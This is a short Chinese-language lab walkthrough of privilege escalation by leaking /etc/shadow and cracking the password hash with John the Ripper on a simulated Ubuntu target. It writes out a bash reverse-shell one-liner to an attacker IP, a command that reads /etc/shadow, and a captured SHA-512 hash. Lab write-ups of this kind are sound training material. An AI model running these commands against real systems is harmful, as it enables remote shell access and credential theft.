### /etc/shadow 泄露 + john 碰撞哈希提权

环境准备：一台 KaliLinux（攻击者）和一台 Ubuntu 12.04.5（靶标）

![](https://pic1.imgdb.cn/item/68bf548958cb8da5c88af39e.png)

![](https://pic1.imgdb.cn/item/68bf54b358cb8da5c88af3bc.png)

在靶标上手动创建反弹 Shell 模拟已进入内网情况

```sh
bash -i >& /dev/tcp/192.168.41.151/6767 0>&1
```

![](https://pic1.imgdb.cn/item/68bf558958cb8da5c88af412.png)

模拟当 `shadow` 文件配置错误导致泄露账号密码情况

```sh
sudo cat /etc/shadow
```

![](https://pic1.imgdb.cn/item/68c70787c5157e1a880206f1.png)

拿到密码哈希

```
$6$D0fVPeaX$Fgk1oHZwz5skFzXDDlEQqeqyy.DLFLLp2hxjnz/gm07s7CMbfXuqH.fnOnuA1L3olNfLLSXpD0Xik2vYjzPhO.
```

使用工具 john 碰撞拿到密码 123456

![](https://pic1.imgdb.cn/item/68c7088fc5157e1a880207fa.png)